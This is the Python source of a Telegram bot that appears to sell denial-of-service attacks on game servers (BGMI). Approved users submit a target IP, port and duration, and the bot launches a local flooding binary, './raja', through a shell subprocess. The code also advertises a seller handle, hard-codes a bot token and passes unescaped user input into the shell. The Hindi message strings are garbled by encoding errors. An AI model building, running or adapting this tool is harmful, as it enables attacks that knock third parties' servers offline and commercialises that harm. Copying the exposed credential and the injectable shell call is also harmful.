import os
import telebot
import logging
import asyncio
from threading import Thread

loop = asyncio.new_event_loop()

TOKEN = "7040782410:AAFAeBf3gIc0O80inFWlufCtlsRDnXNnJYM"
FORWARD_CHANNEL_ID = -1002289285657

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

bot.bgmi_in_progress = False
bot.bgmi_duration = 0
bot.bgmi_start_time = 0
authorized_users = set()  # Set to store authorized users


@bot.message_handler(commands=['start'])
def handle_start(message):
    if message.chat.type == 'group':
        # Group: No authorization needed
        bot.reply_to(message, "тЬЕ рдмреЙрдЯ рдЕрдм рдЧреНрд░реБрдк рдореЗрдВ рдПрдХреНрдЯрд┐рд╡ рд╣реИ рдФрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реИ!")
    else:
        # Personal chat: Authorization required
        user_id = message.from_user.id
        username = message.from_user.username or "рд╕реЗрдЯ рдирд╣реАрдВ"
        first_name = message.from_user.first_name or "рд╕реЗрдЯ рдирд╣реАрдВ"
        last_name = message.from_user.last_name or ""

        full_name = f"{first_name} {last_name}".strip()
        status = "рдЕрдиреБрдорддрд┐ рд▓рдВрдмрд┐рдд рд╣реИ" if user_id not in authorized_users else "рдЕрдиреБрдорддрд┐ рд╕реНрд╡реАрдХреГрдд"

        welcome_message = f"""
*Welcome to ЁЭРАЁЭРЖЁЭРЗЁЭРОЁЭРСЁЭРИ ЁЭРБЁЭРАЁЭРБЁЭРАЁЯЪА  
ANY INQUIRYS AND BUY_ @AGHORI_HACKER

*рдЖрдкрдХреА рдЬрд╛рдирдХрд╛рд░реА:*  
ЁЯСд рдирд╛рдо: {full_name}  
ЁЯФС рдпреВрдЬрд░рдиреЗрдо: @{username}  
ЁЯЖФ рдЖрдИрдбреА рдирдВрдмрд░: {user_id}  
ЁЯУЛ рд╕реНрдерд┐рддрд┐: {status}  

*Commands:*  
- /bgmi - рдЕрдЯреИрдХ рд╢реБрд░реВ рдХрд░реЗрдВ (рдЬреИрд╕реЗ: IP Port Time)  
- /time - bgmi TIME CHEAK COMMANDрдВ  
"""

        if user_id not in authorized_users:
            bot.reply_to(message, welcome_message + "\n\nЁЯФТ *рдмреЙрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╣рд▓реЗ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред* /authorize рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред")
        else:
            bot.reply_to(message, welcome_message)


@bot.message_handler(commands=['authorize'])
def handle_authorize(message):
    if message.chat.type != 'private':
        bot.reply_to(message, "тЭЧ рдпрд╣ рдХрдорд╛рдВрдб рдХреЗрд╡рд▓ рдирд┐рдЬреА рдЪреИрдЯ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред")
        return

    user_id = message.from_user.id
    if user_id in authorized_users:
        bot.reply_to(message, "тЬЕ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЕрдиреБрдордд рд╣реИрдВред")
    else:
        bot.reply_to(message, "ЁЯФТ рдЖрдкрдХреА рдЕрдиреБрдорддрд┐ рдХреА рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рднреЗрдЬреА рдЧрдИ рд╣реИред рдХреГрдкрдпрд╛ рдПрдбрдорд┐рди рдХреЗ рд╕реНрд╡реАрдХреГрдд рдХрд░рдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВред")
        bot.send_message(FORWARD_CHANNEL_ID, f"ЁЯФФ *рдирдИ рдЕрдиреБрдорддрд┐ рдЕрдиреБрд░реЛрдз!*\n\n"
                                             f"ЁЯСд рдирд╛рдо: {message.from_user.first_name}\n"
                                             f"ЁЯЖФ рдЖрдИрдбреА: {user_id}\n"
                                             f"рдпреВрдЬрд░рдиреЗрдо: @{message.from_user.username or 'рд╕реЗрдЯ рдирд╣реАрдВ'}\n"
                                             f"рд╕реНрдерд┐рддрд┐: рд╕реНрд╡реАрдХреГрддрд┐ рд▓рдВрдмрд┐рдд\n\n"
                                             f"рд╕реНрд╡реАрдХреГрдд рдХрд░реЗрдВ: /approve {user_id}", parse_mode='Markdown')


@bot.message_handler(commands=['approve'])
def handle_approve(message):
    if message.chat.id != FORWARD_CHANNEL_ID:
        return

    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "тЭЧ рдХреГрдкрдпрд╛ рд╕рд╣реА рдлреЙрд░реНрдореЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ: `/approve <user_id>`ред", parse_mode='Markdown')
        return

    user_id = int(args[1])
    authorized_users.add(user_id)
    bot.send_message(user_id, "тЬЕ рдмрдзрд╛рдИ рд╣реЛ! рдЕрдм рдЖрдк рдмреЙрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред")
    bot.reply_to(message, f"рдпреВрдЬрд░ {user_id} рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЕрдиреБрдордд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред")


@bot.message_handler(commands=['bgmi'])
def handle_bgmi_command(message):
    if message.chat.type == 'private' and message.from_user.id not in authorized_users:
        bot.reply_to(message, "тЭЧ рдЖрдк рдЗрд╕ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдордд рдирд╣реАрдВ рд╣реИрдВред рдХреГрдкрдпрд╛ /authorize рд╕реЗ рдЕрдиреБрдорддрд┐ рдорд╛рдВрдЧреЗред")
        return

    if bot.bgmi_in_progress:
        bot.send_message(message.chat.id, "тЪая╕П рдХреГрдкрдпрд╛ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ! рдмреЙрдЯ рдЕрднреА рдПрдХ рдЕрдиреНрдп рдЕрдЯреИрдХ рдкрд░ рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реИред")
        return

    bot.send_message(message.chat.id, "ЁЯТг рдЕрдЯреИрдХ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░?\n"
                                      "рдЯрд╛рд░рдЧреЗрдЯ IP, рдкреЛрд░реНрдЯ рдФрд░ рд╕рдордп (рд╕реЗрдХрдВрдб рдореЗрдВ) рднреЗрдЬреЗрдВред\n"
                                      "рдЙрджрд╛рд╣рд░рдг: `167.67.25 6296 240 ` ЁЯФе", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_bgmi_command)


def process_bgmi_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "тЭЧ рддреНрд░реБрдЯрд┐! рдХреГрдкрдпрд╛ IP, рдкреЛрд░реНрдЯ рдФрд░ рд╕рдордп рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рджрд╛рди рдХрд░реЗрдВред", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"ЁЯФТ рдкреЛрд░реНрдЯ {target_port} рдмреНрд▓реЙрдХ рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред", parse_mode='Markdown')
            return
        if duration > 240:
            bot.send_message(message.chat.id, "тП│ рдЕрдзрд┐рдХрддрдо рд╕рдордп 240 рд╕реЗрдХрдВрдб рд╣реИред", parse_mode='Markdown')
            return

        bot.bgmi_in_progress = True
        bot.bgmi_duration = duration
        bot.bgmi_start_time = loop.time()

        asyncio.run_coroutine_threadsafe(run_bgmi_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"ЁЯЪА рдЕрдЯреИрдХ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛!\n"
                                          f"рдЯрд╛рд░рдЧреЗрдЯ рд╣реЛрд╕реНрдЯ: {target_ip}\n"
                                          f"рдЯрд╛рд░рдЧреЗрдЯ рдкреЛрд░реНрдЯ: {target_port}\n"
                                          f"рд╕рдордп: {duration} рд╕реЗрдХрдВрдб!", parse_mode='Markdown')
        
        # New reply after bgmi launch with your updated message
        bot.send_message(message.chat.id, "Attack lag gya hai Screen shot lo busdike or send kar. @AGHORI_HACKER")

    except Exception as e:
        logging.error(f"Error processing bgmi command: {e}")
        bot.bgmi_in_progress = False


async def run_bgmi_command_async(target_ip, target_port, duration):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./raja {target_ip} {target_port} {duration} {900}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await process.communicate()
        logging.info(f"bgmi Output: {stdout.decode()}")
        if stderr:
            logging.error(f"bgmi Error: {stderr.decode()}")
    except Exception as e:
        logging.error(f"Error during bgmi execution: {e}")
    finally:
        bot.bgmi_in_progress = False


@bot.message_handler(commands=['time'])
def handle_time_command(message):
    if not bot.bgmi_in_progress:
        bot.send_message(message.chat.id, "рдЕрднреА рдХреЛрдИ рд╕рдХреНрд░рд┐рдп рдЕрдЯреИрдХ рдирд╣реАрдВ рд╣реИред")
    else:
        elapsed_time = loop.time() - bot.bgmi_start_time
        remaining_time = max(0, bot.bgmi_duration - elapsed_time)
        bot.send_message(message.chat.id, f"рд╡рд░реНрддрдорд╛рди рдЕрдЯреИрдХ рдХреЗ рд▓рд┐рдП рд╢реЗрд╖ рд╕рдордп: {int(remaining_time)} рд╕реЗрдХрдВрдбред")


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()


if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()
